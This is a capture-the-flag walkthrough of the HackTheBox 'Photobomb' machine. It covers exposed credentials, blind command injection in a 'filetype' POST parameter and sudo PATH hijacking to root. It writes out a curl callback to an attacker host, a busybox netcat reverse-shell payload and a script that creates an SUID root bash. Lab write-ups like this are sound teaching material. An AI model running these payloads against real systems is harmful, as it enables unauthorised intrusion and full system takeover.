## Welcome everyone!

Today, we will explore *Photobomb*, an easy-level machine from **HackTheBox**.

Without further ado, let’s get started!

![image](/HTB/Photobomb/Photobomb_images/1.png)

(Please ensure that you have added the following line   `TARGET_IP     photobomb.htb`   to your local `/etc/hosts` file to enable DNS resolution)





## Information Gathering



First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the target:

![image](/HTB/Photobomb/Photobomb_images/2.png)


We can identify two exposed services:

- **SSH** (OpenSSH 8.2p1 | 22)
- **HTTP** (nginx 1.18.0 | 80)

We can start our enumeration phase by inspecting the website hosted on port **80**:

![image](/HTB/Photobomb/Photobomb_images/3.png)

The homepage appears to be a static webpage. However, it contains a link that redirects us to a `/printer` endpoint prompting with an **HTTP Basic Auth**:

![image](/HTB/Photobomb/Photobomb_images/4.png)

Trying a few common credential combinations does not yield any results.

Inspecting the source code of the website, we can identify an intriguing `photobomb.js` file. It may contain something interesting:

![image](/HTB/Photobomb/Photobomb_images/5.png)

The JavaScript file exposes the plaintext credentials used to authenticate to the `/printer` endpoint. We can use it to authenticate legitimately:

![image](/HTB/Photobomb/Photobomb_images/6.png)

![image](/HTB/Photobomb/Photobomb_images/7.png)

We now have access to the `/printer` directory. The web application allows us to download some pictures. Let’s intercept the request in **Burp Suite** to learn more about this behavior:

![image](/HTB/Photobomb/Photobomb_images/8.png)

The application relies on three **POST parameters** to process the request:
 `photo`, `filetype`, `dimensions`.

## Initial Access

One of these parameters is vulnerable to **blind command injection**: the `filetype` parameter. By injecting a **semicolon** (`;`) into the `filetype` parameter, we can append **arbitrary system commands**, leading to command injection.

Although the web application response doesn’t indicate whether our command has been executed, we can test directly if the target can reach our local machine by setting up a **Python server** (via `python3 -m http.server PORT`) and sending the following payload in the `filetype` parameter to make an HTTP request:

`;curl+http://ATTACKER_IP:PYTHON_PORT`

![image](/HTB/Photobomb/Photobomb_images/9.png)

We can confirm the presence of the vulnerability from the HTTP request made by the target machine. The application likely constructs a system command using the user-controlled `filetype` parameter without proper sanitization. By injecting a shell metacharacter (`;`), we terminate the intended command and append arbitrary commands executed by the underlying shell.

We can send the following payload through the POST parameter to spawn a reverse shell to our local machine in order to obtain initial access over the target system :

`busybox+nc+ATTACKER_IP+NC_PORT+-e+sh`

(ensure that you have set up a **netcat listener** using `nc -lvnp PORT`  to catch the connection)

![image](/HTB/Photobomb/Photobomb_images/10.png)

The request should hang in Burp Suite and the reverse shell should be received, granting initial access on the target machine as the user **wizard**!

Since the current shell has no job controll, we can stabilize it with the following command:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

We can start our local enumeration of the target system by checking the `/etc/passwd` file to see if there are other users on the system:

![image](/HTB/Photobomb/Photobomb_images/11.png)

It seems that there are no other non-root user present on the system, which means that we can retrieve the user flag in the `/home/wizard` directory:

![image](/HTB/Photobomb/Photobomb_images/12.png)





## Privilege Escalation



We now need to escalate our current privileges to **root** in order to retrieve the final flag.

It is a good practice to start enumerating local privilege escalation vectors by running `sudo -l` to see whether our compromised user is able to run any command with **root privileges**:

![image](/HTB/Photobomb/Photobomb_images/13.png)

It appears that we can run a `cleanup.sh` Bash script as **root** without providing any password. Moreover, `SETENV` is enabled, which allows us to define environment variables when executing the command through `sudo`.
if the script invokes a binary using a relative path rather than its absolute path (such as `cat` instead of `/usr/bin/cat`), we may be able to hijack its execution through the `PATH` environment variable. We could run the following command:

`sudo PATH=/home/wizard:$PATH /opt/cleanup.sh`

Let’s inspect the script to see whether it contains any misconfiguration:

![image](/HTB/Photobomb/Photobomb_images/14.png)

As we can see, the script calls the `find` binary without providing the absolute path. Because we can provide any environment variable through the script execution, we could perform **Path Hijacking** to trick the script into executing our malicious binary instead of the legitimate one. To do this, we first need to create a file containing the same name as the vulnerable binary invoked in the `cleanup.sh` script. We will create a `find` file containing the following script:

`#!/bin/bash`

`cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`

![image](/HTB/Photobomb/Photobomb_images/15.png)

The script simply copies `/bin/bash` into `/tmp/rootbash` and sets the **SUID bit** on it. The SUID bit allows a binary to execute with the privileges of its owner, rather than the user executing it. Since the malicious script will be executed with **root privileges** from the `cleanup.sh` script running with `sudo`, we would be able to spawn a **root Bash shell**.

Once the malicious script has been created, we can execute the following command to path hijack the relative `find` binary present in the script:

`sudo PATH=/home/wizard:$PATH /opt/cleanup.sh`

We force the system to prioritize `/home/wizard` in the `PATH` variable to execute system commands. Since our malicious `find` file exists in the `/home/wizard` folder, the script will find and execute it instead of the legitimate `/usr/bin/find` binary, which was placed further down in the environment variable. Consequently, our malicious script will be executed with **root privileges**:

![image](/HTB/Photobomb/Photobomb_images/16.png)

Our Path Hijacking was successful! Our script has been executed instead of the expected one. We created a `/bin/bash` with the root SUID bit set on it, allowing us to spawn a Bash shell with owner permissions, leading to a **root shell**:

![image](/HTB/Photobomb/Photobomb_images/17.png)

We successfully escalated our privileges to **root**, granting full access and control over the target system. We can now navigate to the /root directory and retrieve the final flag:

![image](/HTB/Photobomb/Photobomb_images/18.png)

Challenge completed!

![image](/HTB/Photobomb/Photobomb_images/19.png)





## Conclusion



This CTF was very pleasant to complete. We started by enumerating a website hosting a protected `/printer` endpoint with HTTP Basic Auth. Inspecting the source code of the root webpage, we found a **Javascript** file containing the cleartext credentials used to access the `/printer` resource.

This allowed us to access a web application offering the ability to download some file through a POST request. Inspecting the request in Burp Suite, we identified a POST parameter used in the request that was vulnerable to command injection. We could confirm the vulnerability by hosting a Python server that we reached through a `curl` injected command in the vulnerable parameter. We leveraged this vulnerability by spawning a reverse shell to obtain our **initial foothold** on the target system as the **wizard** user.

We were able to run `sudo -l` without providing any password to reveal a Bash script that we could run with **root privileges**. Since `SETENV` was enabled in our `sudo` configuration and the script didn’t provide the absolute path for the `find` command, we tricked it to execute a `find` script we controlled through **Path Hijacking** by specifying the path of the malicious file via the `PATH` environment variable. This allowed us to clone a `/bin/bash` binary in an accessible directory and setting on it the SUID bit. Since the script was root-executed, we were able to spawn a root shell through its execution, granting full access and control over the machine.
This challenge demonstrates how multiple low-impact misconfigurations—when chained together—can result in full system compromise from initial access to **root**.

**Thank you for reading!**
